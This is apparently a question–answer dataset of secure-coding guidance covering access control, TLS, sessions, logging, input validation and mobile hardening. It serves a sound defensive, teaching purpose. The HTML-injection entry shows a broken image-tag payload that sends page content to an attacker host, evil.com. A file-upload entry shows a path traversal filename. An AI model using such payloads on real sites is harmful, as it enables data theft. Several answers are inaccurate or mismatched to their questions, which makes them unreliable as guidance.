How to resolve Principle of least privilege?,"The principle means giving a user account only those privileges which are essential to that user’s work. For example, a backup user does not need to install software: hence, the backup user has rights only to run backup and backuprelated applications. Any other privileges, such as installing new software, are blocked.The principle applies also to a personal computer user who usually does work in a normal user account, and opens a privileged, password protected account (that is, a superuser) only when the situation absolutely demands it.This principle can also be applied to your webapplications. Instead of solely depending on role based authentication methods using sessions, we rather want to assign privileges to users by means of a DatabaseBased Authentication system.We still use sessions in order to identify if the user was logged in correctly, only now instead of assigning that user with a specific role we assign him with privileges to verify which actions he is privileged to perform on the system.Also, a big pro of this method is, whenever a user has to be assigned fewer privileges your changes will be applied on the fly since the assigning does not depend on the session which otherwise had to expire first."
How to resolve TLS implementation must operate in an approved mode of operation?,See See http://csrc.nist.gov/groups/STM/cmvp/documents/fips1402/FIPS1402IG.pdf for more extended details on how to reach this goal.
How to resolve Character encoding?,"When trying to figure out the character encoding of a resource, user agents will try, in this order: The HTTP ContentType header sent by the server The XML declaration (only for XHTML documents) HTML/XHTML meta element.Make sure this information is provided by your application for the server in order to prevent it from guessing the wrong encoding standard, leaving room for injection. Note:These three ways of providing the character encoding of a document are not equivalent."
How to resolve HTTP request methods?,"Verify that the application accepts only a defined set of HTTP request methods, such as GET and POST and unused methods are explicitly blocked/disabled."
How to resolve Verbose version information?,"Verify that the HTTP headers do not expose detailed version information of system components. For each different type of server, there are hardening guides dedicated especially for this type of data leaking. The same applies for i.e any other leak of version information such as the version of your programming language or other services running to make your application function."
How to resolve HTTP headers added by a frontend?,Verify the integrity and authenticity of the HTTP headers added by a trusted proxy or SSO devices by checking the digital signature or by recalculating the hash or integrity method using a private key or passphrase.
How to resolve Session management control?,Always use the frameworks default session management control implementation in your application. If not possible you should find hardened guides in how to accomplish this in a secure manner.
How to resolve Available log analysis tools?,A list of recommended tools by OWASP you can find at https://www.owasp.org/index.php/Log_review_and_managementLogging_Tools
How to resolve Distinguish log?,Verify that log fields from trusted and untrusted sources are distinguishable in log entries. If possible it is highly recommended that you separate these files entirely from each other so the logs with untrusted userinput cannot corrupt the system generated logs.
How to resolve Sanitise sensitive data rapidly from memory?,Verify that sensitive data is rapidly sanitized from memory as soon as it is no longer needed and handled in accordance with functions and techniques supported by the framework/library/operating system.
How to resolve Logging is performed before executing the transaction?,"Verify that logging is performed before executing the transaction. If logging was unsuccessful (e.g. disk full, insufficient permissions) the application fails safe. This is for when integrity and nonrepudiation is a must."
How to resolve Verify integrity using checksums?,"Verify that the integrity of interpreted code, libraries, executables, and configuration files is verified using checksums or hashes (not MD5)."
How to resolve Deny access from remote resources or systems?,Since this is very difficult to achieve on application level we recommend implementing EGRESS firewall rules.
How to resolve Certificate paths revocation information?,"The trust anchor for given zone is found in the keyset<zone name> file on the secure signing computer in the same location where the signed and unsigned copies of the zone reside. This file is created automatically as part of the signing process. A certificate revocation list (CRL) is a list, created and signed by a certificate authority (CA), which contains serial numbers of certificates that have been issued by that CA and are currently revoked. In addition to the serial number of the revoked certifications, the CRL also contains the reason for revocation for each certificate and the time the certificate was revoked. The serial number for each revoked certificate is kept in the CAs database and published in the CRL until the certificate expires.After the revoked certificate is expired, the certificates entry in the CRL is removed and the CA may remove the certificate from its database. Typically, the revoked certificate will remain in the CRL for one publication period after the certificate expires. By all times you should have this information in reach in order to take quick actions."
How to resolve HTML Caching and client side caching?,Never store sensitive information in a client side cache since this can be easily compromised by attackers. The same principle does also apply to autocomplete functions.Recommended knowledge base item: Caching headers Client side storage
How to resolve Cryptographic modules should operate in their approved mode according to their published security policies?,Always verify that cryptographic modules operate in their approved mode according to their published security policies before implementing them into your application.
How to resolve Sending data parameters to untrusted devices?,"Verify the application minimizes the number of parameters sent to untrusted systems, such as hidden fields, Ajax variables, cookies and header values.These untrusted devices should also be documented if possible and should be taken into account when developing your application to minimize the possibility you send unintended sensitive data towards these devices.Recommended knowledge base items: Highlevel architecture should be defined Identify all application components"
How to resolve Proces high value business logic flows in a trusted environment?,"Verify the application processes or verifies all highvalue business logic flows in a trusted environment, such as on a protected and monitored server."
How to resolve Data from untrusted sources?,Verify the application code does not execute uploaded data obtained from untrusted sources. You could consider sandboxing this data when showing the content on your application.NOTE: Sandboxing however does not stop an XXE attack. So it is highly recommended to also encode or escape all data entering your application from third party sources.
How to resolve User restriction for sensitive data?,"Whenever sensitive data is stored on the server store the data in a separate folder with permission rules in order to prevent unauthorized users from reading the files. As an indepth solution, you could also check if the session of the user has sufficient privileges to read the files according to the level of authorization. Recommended knowledge base item: • Missing authentication or authorization • Sanitize sensitive data rapidly from memory"
How to resolve Runtime environment?,"There are a number of runtime solutions that can detect stack corruption and buffer overruns or guard against attacks. These solutions typically terminate the program when an anomaly is detected, preventing the execution of arbitrary code."
How to resolve Automatic parameter binding?,When working with automatic variable binding you should create whitelists of what parameters are expected and allow only these parameters to be passed into your application operation.
How to resolve Cryptographic function implementation?,Verify that all cryptographic functions used to protect secrets from the application user are implemented server side.
How to resolve Cryptographic modules must fail securely?,We recommend using the National Institute of Standards and Technology (NIST) standard on testing the cryptographic module making it perform the selftests to see if it fails securely.
How to resolve Access to any master secret must be protected from unauthorized access?,Whenever sensitive data is stored on the server you should consider storing this data in a separate folder with permission rules in order to prevent unauthorized users from reading these files. It is also highly recommended to encrypt/hash the password in order to enforce higher security.
How to resolve Enforce policys for sensitive data processing?,"First, you have to create a list which contains locations of where all sensitive data is used and processed. Next, you create a policy that tells who is allowed and to what extent they have privileges to look into which data. When this data moves through the network it should always be encrypted (TLS) and also be stored encrypted. Thereafter you should establish monitoring and testing methods to verify that everything stays encrypted and your policies are properly enforced. Also, determine whenever data storage is necessary or becomes a redundancy. Whenever sensitive data does not have to be stored don't store it. This reduces the quantity of data may your application ever be compromised. Ultimately, verify accessing sensitive data is logged, if the data is collected under relevant data protection directives or where logging of accesses is required. Sensitive data or primary keys, such as personally identifiable information or credit cards should also be anonymized, masked or truncated on the server before transmission to the client."
How to resolve Access control pattern?,"It is highly recommended to study all the listed items and implement these principles in your access control/login system in order to enforce a higher level of security.1. Audit logs 2. Principle of least privilege (Privilege based authentication system) 3. Passwords must be encrypted, salted and stretched 4. CrossSite Request Forgery (CSRF for authenticated forms) 5. Session pattern 6. Session fixation 7. Session hijacking 8. Forget password functions 9. Client side authentication 10. Client side state management 11. Cross subdomain cookie attack"
How to resolve Password forget pattern?,"The first thing is verify the password has been forgotten and other recovery paths send a link including a timelimited activation token rather than the password itself. Additional authentication based on softtokens (e.g. SMS token, native mobile applications, etc.) can be required as well before the link is sent over. Second, you should not lock out the user’s account whilst the process of getting a new password is in progress. This could lead to a Denial of service attack whenever an attacker decides to intentionally lock out the users with an automated attack. Third, whenever the new password request was set in progress, the message you display should be generalized in order to prevent username enumeration. Fourth, always disallow the use of old passwords and implement a strong password policy."
How to resolve Sessions pattern?,"The items as pointed out before should be looked into and taken into consideration whenever you are working with sessions on your system in order to enforce a high level of security.Though there are more than ten design patterns related to session, all of them need to be implemented. If any one is left out for implementation, the whole session management layer is not secure and could be defeated by attackers."
How to resolve Submit forms pattern?,"Here are the steps described briefly. For more detailed information you should look into these items in the knowledge base.First, you should create a single user input validation control class which should validate the expected input values in order to verify if the user is not tampering data or is injecting malicious code into your application. All infringements should be logged and repercussions should be taken whenever these infringements are frequent.Second, whenever an authenticated user is submitting the form always ensure the forms contain CSRF tokens in order to prevent crosssite request forgery. Third, Whenever there are authenticated users with different roles/privileges you should enforce restrictions on the server side upon your form submits/processing in order to prevent privilege escalation. You should apply the principle of least privilege in order to ensure a higher level of security. Fourth, Whenever the application is sending sensitive data through the form submit this data must always be sent through a POST variable instead of a GET since a GET will leak this data through the URL by example the referrer header."
How to resolve SQL injection Column truncation?,"On critical places where unique values are enforced and expected, such as usernames in order to authorize or distribute certain privileges. The users submit should be checked on the server side in order to verify if it does not exceed the limit set in your database."
How to resolve User registration pattern?,"The items as pointed out before should be looked into and taken into consideration whenever you are letting users register on your system in order to enforce a high level of security.Here are the steps described briefly. For more detailed information you should look into these items in the knowledge base.First, You enforce limits on the length of the users submits on the server side in order to prevent him from truncating his submits. These limits have to correlate with the limits you set in your column in the database.Second, you should create a single user input validation control class which should validate the expected input values in order to verify if the user is not tampering data or injecting malicious code into your application. All infringements should be logged and repercussions should be taken whenever these infringements are frequent.Third, never display the user’s password on a screen anywhere.Fourth, Whenever you generate a password for your users, this password should always be randomized sufficiently.Fifth, encrypt your passwords by proven cryptographic standards when storing them.Sixth, Enforce secure passwords by implementing good password policies."
How to resolve Cross subdomain cookie attack?,In this scenario changing the sessionID on login does not make any difference since Alice is already logged in when she visits Mallory's evil web page.It is good practice to use a completely different domain for all trusted activity.For example Google uses google.com for trusted activities and *.googleusercontent.com for untrusted sites.Also when setting your cookies to specify which domains they are allowed to be send to. Especially on your trusted domain you do not want to leak cookies to unintended subdomains. highly recommended is to not use wildcards when setting this option.
How to resolve HTML injections?,"1.Content spoofing Otherwise known as ""Content Injection"" or ""Virtual Defacement"" occurs whenever an attacker can inject code into your application. It is very important to sanitize and or encode user data before you display it on screen as HTML.2.Image tag injection occurs whenever an attacker injects a broken image tag with a nonterminated parameter like: ""img src='http://evil.com?steal.php?value= Every content after value= parameter will now be stolen and send to evil.com by the attacker till the injection finds the next occurrence of a matching single quote. Again you should sanitize and encode the user input to prevent an image tag from being injected in your application. For whenever a user is permitted to submit an image on your application enforce and verify the application accepts valid nonbroken tags only.3.The ""form"" tag can't be nested. The toplevel occurrence of this element always takes precedence over subsequent appearances. Again you must avoid this type by properly encoding and sanitizing your userinputs.4.Whenever an attacker injects a ""base"" tag into your application it can steal data because the tag specifies the base URL/target to where to process the data to. The solution to base jumping would be to use absolute paths in your application such as action='/update_profile.php' instead of: action='update_profile.php'5/6 can both also easily be prevented simply be encoding or sanitizing your userinput submitted towards your application. Always validate your user input on a high level(serverside constraint). Whenever your application expects an integer you should validate and check whether the user submitted input really is what you expected it to be and otherwise, you terminate and log the request."
How to resolve RFD and file download injections?,"First, never use user input directly into your headers since an attacker can now take control over it.Secondly, you should check if a filename really does exist before presenting it towards the users. You could also create a whitelist of all files which are allowed to be downloaded and terminate requests whenever they do not match.Also, you should disable the use of ""path parameters"". It increases the attacker’s attack vector and these parameters also cause a lot of other vulnerabilities. And last you should sanitize and encode all your userinput as much as possible. Reflective file downloads depend on userinput being reflected in the response header. Whenever this input has been sanitized and encoded it should not do any harm to any system it is being executed on"
How to resolve identify all application components?,"Verify that all application components (either individual or groups of source files, libraries, and/or executables) that are present in the application are identified.When you identified these components you may want to map and document them in order to have a quick reference to this infrastructure when needed."
How to resolve Identify external dependencies?,"First, you must identify which external dependencies your application relays on for its operation. Second, there should be a failsafe implemented should this dependency ever fail to deliver its services towards your application."
How to resolve High level architecture should be defined?,"Verify that a highlevel architecture for the application has been defined. This means some sort of a technical resign has to be composed of this architecture and all the elements it provides. This gives a visual representation of your application and makes it easier to work through.While you are mapping your application architecture you should also add all other components your application contains in terms of business functions and/or security functions they provide.When you map these components it becomes more transparent about different types of security mitigations that might be forgotten for some of your business functions. Because again, you now own a visual representation of this logic. Your application also becomes more manageable in terms of keeping up with the latest security updates and patches and gives you a better view of obsolete configurations, functions, and components which can be removed from the system."
How to resolve Threat modeling?,"Threat modeling is best applied continuously throughout a software development project. The process is essentially the same at different levels of abstraction, although the information gets more and more granular throughout the lifecycle. Ideally, a highlevel threat model should be defined in the concept or planning phase, and then refined throughout the lifecycle. As more details are added to the system, new attack vectors are created and exposed. The ongoing threat modeling process should examine, diagnose, and address these threats.Note that it is a natural part of refining a system for new threats to be exposed. For example, when you select a particular technology such as Java for example you take on the responsibility to identify the new threats that are created by that choice. Even implementation choices such as using regular expressions for validation introduce potential new threats to deal with.More indepth information about threat modeling can be found at: https://www.owasp.org/index.php/Application_Threat_Modeling"
How to resolve Differential analysis attack?,"Verify that all authentication challenges, whether successful or failed, should respond in the same average response time. This same methodology applies for other sensitive information that could potentially be recovered with differential attacks."
How to resolve Client side input validation?,"First, there must be a client side input validation method as you would apply to the server side. This means you should also apply input rejection as well as typecasting and such. This is to prevent users from being attacked by XSS attacks which are undetectable by the server.Recommended knowledge base items: Positive validation method Single input validation controls Input rejection Input validation"
How to resolve Positive validation model?,First there must be a client side input validation method as you would apply to the server side. This means you should also apply input rejection as well as typecasting and such. This is to prevent users from being attacked by XSS attacks which are undetectable by the server.
How to resolve TLS certificate public key pinning?,"The idea is to reuse the existing protocols and infrastructure, but use them in a hardened manner. For reuse, a program would keep doing the things it used to do when establishing a secure connection.To harden the channel, the program would take advantage of the OnConnect callback offered by a library, framework or platform. In the callback, the program would verify the remote host's identity by validating its certificate or public key. While pinning does not have to occur in an OnConnect callback, it is often most convenient because the underlying connection information is readily available.For more extended information on different types of implementation please see: https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning"
How to resolve HSTS preload?,"In order to be included on the HSTS preload list, your site must:1. Have a valid certificate (which must expire before 2016 if it uses SHA1). 2. Redirect all HTTP traffic to HTTPS—i.e. be HTTPS only. 3. Serve all subdomains over HTTPS, specifically including the www subdomain if a DNS record for that subdomain exists. 4. Serve an HSTS header on the base domain: * Expiry must be at least eighteen weeks (10886400 seconds). * The includeSubdomains token must be specified. * The preload token must be specified. * If you are serving a redirect, that redirect must have the HSTS header, not the page it redirects to.For more details on HSTS, please see RFC 6797. Note that the preload flag in the HSTS header is required to confirm and authenticate your submission to the preload list. An example valid HSTS header: StrictTransportSecurity: maxage=10886400; includeSubDomains; preloadAdding your website to the list: https://www.chromium.org/hsts Source: https://wiki.mozilla.org/Privacy/Features/HSTS_Preload_List"
How to resolve Forward secrecy ciphers?,"In the beginning SSL handshake, the client sends a list of supported cipher suites (among other things). The server then picks one of the cipher suites, based on a ranking, and tells the client which one they will be using.This step is the one that determines whether or not the future connection will have perfect forward secrecy. Note that, at this point, certificates have not entered the picture at all. This is because whether or not a connection has perfect forward secrecy is determined by how the session key is derived. And how the session key is derived is determined by the cipher suite in use. So, the cipher suites that use ephemeral DiffieHellman (DHE) or the elliptic curve variant (ECDHE) will have perfect forward secrecy while the other options will not."
How to resolve OCSP stapling?,"Stapling basically means that the certificate holder queries the OCSP server themselves at regular intervals, obtaining a signed timestamped OCSP response. When the site's visitors attempt to connect to the site, this response is included (""stapled"") with the TLS/SSL Handshake via the Certificate Status Request extension response (note: the TLS client must explicitly include a Certificate Status Request extension in its ClientHello TLS/SSL handshake message). While it may appear that allowing the site operator to control verification responses would allow a fraudulent site to issue false verification for a revoked certificate, the stapled responses can't be forged as they need to be directly signed by the certificate authority, not the server. If the client does not receive a stapled response, it will just contact the OCSP server by itself. However, if the client receives an invalid stapled response, it will abort the connection. The only increased risk of OCSP stapling is that the notification of revocation for a certificate may be delayed until the lastsigned OCSP response expires.For more detailed information about Specification, Deployment, and limitation visit: https://en.wikipedia.org/wiki/OCSP_stapling"
How to resolve STRIDE?,"The STRIDE was initially created as part of the process of threat modelling. STRIDE is a model of threats, used to help reason and find threats to a system. It is used in conjunction with a model of the target system that can be constructed in parallel. This includes a full breakdown of processes, data stores, data flows and trust boundaries.Today it is often used by security experts to help answer the question ""what can go wrong in this system we're working on?"""
How to resolve File inclusion attack?,"The most effective solution to eliminate file inclusion vulnerabilities is to avoid passing usersubmitted input to any filesystem/framework API. If this is not possible the application can maintain a white list of files, that may be included on the page, and then use an identifier (for example the index number) to access the selected file. Any request containing an invalid identifier has to be rejected, in this way, there is no attack surface for malicious users to manipulate the path.Also, disable the opportunity for the application to load remote resources. This is mostly achieved by adding a server configuration file such as php.ini or web.xml"
How to resolve Access management?,"Verify that access to administration and management functions within the Web Service Application is limited to web service administrators.For example, they could only be accessible from within a restricted source IP range."
How to resolve JSON XML schema?,Verify that XML or JSON schema are in place and verified before accepting input.
How to resolve Limiting user input size?,Verify all the user input has been limited and the application only accepts expected input lengths
How to resolve Parsing data exchange formats?,"We highly recommend doing your own escaping, sanitizing, encoding on all data before entering your application. The risk also depends on the context of wherever you are putting this data into. So before you are doing any mutations with your data after getting it from the resources, make sure you have applied the right mitigations.Also, another reason to build an extra layer of escaping, sanitizing, encoding routines in your application is for the logging you want to apply on the data. Recommended knowledge base items: Input rejection Input validation Audit logs"
How to resolve Content security policy headers?,"A best practice for implementing CSP in your application would be to externalize all JavaScript within the web pages.So this: ``` <script> function doSomething() { alert('Something!'); } </script> <button onclick='doSomething();'>foobar!</button> ``` Must become this: ``` <script src='doSomething.js'></script> <button id='somethingToDo'>Let's foobar!</button> ``` The header for this code could look something like: ``` ContentSecurityPolicy: defaultsrc'self'; objectsrc'none'; scriptsrc'https://mycdn.com' ``` Since it is not entirely realistic to implement all JavaScript on external pages we can apply sort of a crosssite request forgery token to your inline JavaScript. This way the browser can again distinguish the difference between code which is part of the application against probable malicious injected code, in CSP this is called the 'nonce'. Of course, this method is also very applicable on your existing code and designs. Now, to use this nonce you have to supply your inline script tags with the nonce attribute. Firstly, it's important that the nonce changes for each response. Otherwise, the nonce would become guessable. So it should also contain a high entropy and should be hard to predict. Similar to the operation of the CSRF tokens, the nonce becomes impossible for the attacker to predict making it difficult to execute a successful XSS attack. Inline JavaScript example containing nonce: ``` <script nonce=sfsdf03nceI23wlsgle9h3sdd21> <! Your javscript code > </script> ``` Matching header example: ``` ContentSecurityPolicy: scriptsrc 'noncesfsdf03nceI23wlsgle9h3sdd21' ``` There is a whole lot more to learn about the CSP header for indepth implementation in your application. This knowledge base item just scratches the surface and it would be highly recommended to gain more indepth knowledge about this powerful header Very Important: When applying the CSP header, although it blocks XSS attacks. Your application still remains vulnerable to HTML and other code injections. So this is not a substitute for, validation, sanitizing and encoding of userinput."
How to resolve Safe javascript jquery methods?,"Below we listed some safe functions for whenever it is needed to supply your JavaScript/jquery functions with userinput.JQUERY functions: .txt(); .val(); .parse();Example: ```` <script> function myFunction() { $( ""p"" ).text( ""append userinput to paragrapgh safely"" ); } </script> Javscript functions: .innerText(); < not supported by firefox .textContext(); < not supported on I.E 8 and lower .createTextNode(); .value(); ``` Example: ``` <script> function myFunction() {  var t = document.createTextNode(""append userinput to body safely"");  document.body.appendChild(t); } </script> ```"
How to resolve WYSIWYG editors?,Download a HTML sanitizer and configure it to your specific needs. When configuring the sanitizer make sure you disable all unused components. The less options an attacker has to insert into your application the less his attack surface becomes. Also before implementing this HTML sanitizer on a production environment have it first thoroughly examined by security testers since it is a very delicate function.
How to resolve Parsing JSON with Javascript?,For the purpose of parsing JSON we would recommend the use of the json.parse functionality. Even though this function is more trusted you should always build your own security checks and encoding routines around the json.parse before mutating the data or passing it on to a view to be displayed in your HTML.
How to resolve Account lockout?,"Soft lockout: This can be a good option for protecting your users against brute force attacks. For example, whenever the user enters a wrong password three times, the application could lock down the account for a minute in order to slow down the process of brute forcing his password making it less profitable for the attacker to proceed. If u were to implement hard lockout countermeasures for this example you would achieve a ""Dos"" by permanently locking out accounts.Hard lockout: This type of lockout should be applied whenever you detect a user attacking your application and counter him by means of permanently locking out his account until a response team had time to do their forensics. After this process you can decide to give the user back his account or take further legal actions against him. This type of approach prevents the attacker from further penetrating your application and infrastructure.Note: Be cautious that a softlockout countermeasure does not override a hardlockout status."
How to resolve XML attacks?,Items listed below are recommended to read whenever you are planning to use XML in your application.Recommended knowledge base items: XML injection External DTD parsing XSLT injections XPath injections XXE injections
How to resolve Centralized security controls?,Make sure all your different type of security controls have a centralized place of implementation. Also verify that error handling logic in security controls denies access by default.
How to resolve Data controller display layer separation?,"Make sure your different type of data layers are separated in your application.The separation of these different layers is also know as a design pattern which goes by the name MVC (model, view, controller)."
How to resolve Proven authentication mechanisms?,Verify authentication mechanisms in the application are proven and verified against ASVS.
How to resolve Administrative interfaces must not be accessible to untrusted parties?,The first solution is to grant access only from a certain source IP range to the administrative interface. If that solution would not be possible then it is always recommended to enforce a stepup or adaptive authentication for logging in into the administrative interface.Recommended knowledgebase item: Step up or adaptive authentication
How to resolve Concurrent session handling?,"The application should keep track and limit all the granted sessions. It should store your users IP address, session id and user id. After storing these credentials it should do regular checks to see if there are:1. Multiple active sessions linked to same user id 2. Multiple active sessions from different locations 3. Multiple active sessions from different devices 4. Limit and destroy sessions when they exceed an accepted threshold.The more critical the application becomes the lower the accepted threshold for concurrent sessions should be."
How to resolve Auto escaping technology?,"Whenever autoescaping functionality in your application has been disabled for whatever reason, you should make sure there is other protection in place like a HTML sanitizer in order to prevent attackers from injecting malicious code into your application."
How to resolve Client side storage?,"Verify that authenticated data is cleared from client storage, such as the browser DOM, after the session is terminated. This also goes for other session and local storage information which could assist an attacker launching an successful attack.Verify that data stored in client side storage (such as HTML5 local storage, session storage, IndexedDB, regular cookies or Flash cookies) does not contain sensitive data or PII (personal identifiable information)."
How to resolve Log rotation and seperation?,"Log rotation is an automated process used in system administration in which dated log files are archived. Servers which run large applications, such as LAMP stacks, often log every request: in the face of bulky logs, log rotation is a way to limit the total size of the logs while still allowing analysis of recent events.Log separation basically means that you have to store your log files on a different partition as where your OS/application is running on in order to avert a Denial of service attack or the downgrading of your application its performance."
How to resolve HTTP strict transport security?,"When users are visiting the application it should set the following header: These headers should be set in a base class which always sets the header no mather what page the users initially visit.Simple example, using a long (1 year) maxage: StrictTransportSecurity: maxage=31536000If all present and future subdomains will be HTTPS: StrictTransportSecurity: maxage=31536000; includeSubDomains CAUTION: Site owners can use HSTS to identify users without cookies. This can lead to a significant privacy leak.Cookies can be manipulated from subdomains, so omitting the include ""includeSubDomains"" option permits a broad range of cookierelated attacks that HSTS would otherwise prevent by requiring a valid certificate for a subdomain. Ensuring the ""Secure Flag"" is set on all cookies will also prevent, some, but not all, of the same attacks."
How to resolve API resonses security headers?,"Sanitize your API's input (in this case they should just allow alphanumeric); escaping is not sufficientVerify that all API responses contain XContentTypeOptions: nosniff, to prevent the browser from interpreting files as something else than declared by the content type (this helps prevent XSS if the page is interpreted as html or js).Add 'ContentDisposition: attachment; filename=""filename.extension""' with extension corresponding the file extension and contenttype, on APIs that are not going to be rendered"
How to resolve Do not support untrusted client side technologies?,"Do not use Flash, ActiveX, Silverlight, NACL, clientside Java or other client side technologies not supported natively via W3C browser standards."
How to resolve Signed message payloads?,"Verify that the message payload is signed to ensure reliable transport between client and service, using JSON Web Signing or WSSecurity for SOAP requests."
How to resolve Hardware key vault?,"Verify that all consumers of cryptographic services do not have direct access to key material. Isolate cryptographic processes, including master secrets and consider the use of a hardware key vault (HSM)."
How to resolve SOAP basic profile?,"Verify that the SOAP based web services are making use of the WSI Basic profile. To be compliant with this standard, it essentially means the application infrastructure must be TLS protected.Source: http://www.wsi.org/Profiles/SimpleSoapBindingProfile1.0.html"
How to resolve Strong CRYPTO through CA hierachy?,"Verify that only strong algorithms, ciphers, and protocols are used, through all the certificate hierarchy, including root and intermediary certificates of your selected certifying authority. Because this is always in flux werecommend using the: SSLlabs free test https://www.ssllabs.com/ssltest/ OWASP OSAFT : https://www.owasp.org/index.php/OSaftThese TLS hardening recommendations can then be applied on all servers."
How to resolve Build and deploy in a secure fashion?,"Building your application should always be done on a server that you trust, you are in control and has the latest security patches and hardening configured. For deploying the application the same rules apply, also think about what type of third party services can access the code or modify it. Creating scripts to monitor for bad behavior of a third party service can be an option as an extra quality control check."
How to resolve Signed application components?,Create for the different components in the application signed signatures and verify these in the application at starting of the application and at runtime level.
How to resolve Build proccess security hardening?,"Ensure that build processes for system level languages have all security flags enabled, such as ASLR, DEP, and other security checks specific for your application need."
How to resolve Sanitize unstructured data?,"Unstructured data needs to be sanitized to enforce generic safety measures for example: allowed characters character length,Also some characters are potentially harmful in given context and thus should be escaped. (e.g. natural names with Unicode or apostrophes, such as &x306D;&x3053; or O'Hara)"
How to resolve Zero keys and secrets before destroying them?,"Secrets and keys should be erased from the memory and zeroed when they are no longer needed to prevent attackers from doing memory dumping attacks.Also take into consideration the different Garbage collectors of your programming language. Whenever you zero out the keys of secret in question, you have no guarantee that a copy of it doesn't exist elsewhere in memory."
How to resolve Keys and passwords should be replaceable?,Verify in the application and components it uses that it's possible to replace the used keys and passwords. Also replace default keys and passwords after the installation of the application.
How to resolve Enforce random numbers are created with proper entropy at runtime?,"Enforce in your application that random numbers are created with proper entropy even when the application is under heavy load, or that the application degrades gracefully in such circumstances."
How to resolve Segregated components?,"Verify that components are segregated from each other via a defined security control, such as network segmentation, firewall rules, or cloud based security groups."
How to resolve PII protection?,Personally Identifiable Information needs to be stored encrypted at rest and ensure that all communication goes via protected channels like SSL/TLS.
How to resolve Verify application is not vulnerable for known security issues?,"Verify that all application components, libraries, modules, frameworks, platform, and operating systems are free from known vulnerabilities.This could be achieved with for example, strict patch management and periodic scanning of the environment for new issued CVEs'. It is also highly recommended to run the applications libraries and modules in the SDLC through tools like OWASP dependency check. This tool checks imported modules and libraries for known CVEs' https://www.owasp.org/index.php/OWASP_Dependency_Check"
How to resolve Disable autocomplete for all the input fields in forms?,"The browser should explicitly be told for all the input fields that the autocomplete function should be turned off. The ""autocomplete=off"" HTML attribute should be added to all the input and hidden input fields in the form you want to disable the autocomplete of."
How to resolve All time sources should be synchronized?,"Time sources should be synchronized to ensure logs have the correct time. If these time sources are not synchronized, the logs lose integrity and can become untrusted for investigators."
How to resolve Generate strong crypto tokens with at least 120 bit of effective entropy?,Authentication tokens should always be generic and should be cryptographically random strong with at least 120 bit of effective entropy. The best way to implement these tokens is to go with proven methods that are tested on the effective level of entropy.For example JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and selfcontained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.
How to resolve Enforce sensitive information to be stored encrypted on device??,"Sensitive information should always be stored encrypted and preferably on the server side and retrieved using an object reference with proper authorization mechanisms in place. Do not implement an existing cryptographic algorithm on your own, no matter how easy it appears. Instead, use widely accepted algorithms and widely accepted implementations.The cardinal rule of mobile apps is to not store data unless absolutely necessary. As a developer you have to assume that the data is forfeited as soon as it touches the phone. You also have to consider the implications of losing mobile users' data to a silent jailbreak or root exploit."
How to resolve Encrypt sensitive information different depending on context?,"Determine the context of where the sensitive information is being stored, is it a small data set or is the data stored in a SQLite database. For every context determine the applications platform recommended native options settings and follow these recommendations accordingly."
How to resolve Secrets should be secure random generated?,"When it comes to API tokens and secret keys these values have to be dynamically generated and should be cryptographically random secure with at least 120 bit of effective entropy.Passwords on the other hand should be created by the user himself, rather than assigning a user a dynamically generated password. The user should be presented a link with a cryptographically random token by means of an email or SMS which is used to activate his account and provide a password of his own."
How to resolve Protection against different exfiltration techniques?,"Disallow screenshots of the application whenever the application is backgrounded Do not write sensitive information in the applications console, this information is accessible by attackers. Create a custom window for whenever the application is shown in the ActivityManager, so it does not give away sensitive information."
How to resolve Principle of least privilege?,Verify that the application is requesting minimal permissions for required functionality and resources.
How to resolve Protecting device memory?,A very good and known and proven technology that can be used is ASLR (Address Space Layout Randomisation). It does this by randomly offsetting the location of modules and certain inmemory structures that will make the developing of exploits much harder.
How to resolve Enforce anti debugging techniques?,The application has to make use of antidebugging techniques that are sufficient enough to deter or delay likely attackers from injecting debuggers into the application. Also the application has to be able to notice if it's runned on an emulator or a specially designed hardware device that was not intended to be used and to prevent the attacker from gaining knowledge about the application.
How to resolve Protect sensitive activities intents or content providers?,"Identify throughout the application if there are any sensitive activities, intents or content providers that are being exported."
How to resolve Mitigate memory dumping attacks?,"Sensitive information maintained in memory must be overwritten with zeros as soon as it no longer actively used, to mitigate memory dumping attacks.Note: Whenever the programming language has a garbage collector make sure whenever values are zeroed the GC is also emptied."
How to resolve Protect agains exported activities or content providers?,"Input from exported activities, intents or content providers should be validated against the applications intended operation, i.e if the application expects a field with an integer value, all other incoming data that work out of this intended operation should be logged and rejected by the application."
How to resolve Block common password and weak passphrases?,"Verify password entry fields allow, or encourage, the use of passphrases, and do not prevent password managers, long passphrases or highly complex passwords being entered."
How to resolve Application assets hosted on secure location?,"Verify that all application assets are hosted by the application, such as JavaScript libraries, CSS stylesheets and web fonts are hosted by the application rather than rely on a CDN or external provider."
How to resolve CSRF on REST?,"REST (REpresentational State Transfer) is a simple stateless architecture that generally runs over HTTPS/TLS. The REST style emphasizes that interactions between clients and services are enhanced by having a limited number of operationsSince the architecture is stateless, the application should make use of sessions or cookies to store the HTTP sessions, which allow associating information with individual visitors. The preferred method for REST services is to utilize tokens for interactive information interchange between the user and the server. By sending this information solely by means of headers, the application is no longer susceptible to CSRF attacks since the CSRF attack utilizes the browsers cookie jar for succesful attacks."
How to resolve File IO commands?,File names and file contents should be sanitized before being used in I/O commands.
How to resolve File upload anti virus check?,"After uploading the file, the file should be placed in quarantine and antivirus has to inspect the file for malicious viruses. Antivirus software that has a commandline interface is requisite for doing such scans. There are also API's available for other services such as from ""VirusTotal.com"" This site provides a free service in which your file is given as input to numerous antivirus products and you receive back a detailed report with the evidence resulting from the scanning process"
How to resolve File upload outside document root?,"Files should be stored outside of the applications document root. Preferably files should be stored on a seperate file server which serves back and forth to the application server. Files should always be stored outside of the scope of the attacker to prevent files from being parsed or executed.When storing files outside of the document root, take into consideration potential path traversal injections in the applications file name such as ""../html/backtoroot/file.php"". Whenever this filename is being used directly into the path that is used to store files, it could be used to manipulate the storage path."
How to resolve Unauthorized and unauthenticated access security logs?,The security logs could be protected by means of (HIDS). This is a system that monitors important operating system files to make sure the files can only be accessed by particular users. Security log files could also be protected by the OS itself by defining groups and users and grant only a particular set of users access to the files.
How to resolve Commonly chosen weak passwords and passphrases?,The internet is full of top X worst password lists which can be used to verify the users freshly entered password against. Whenever a user enters a password that matches up to a password provided in one of those lists. The password should be rejected and the user should be advised to take another password.
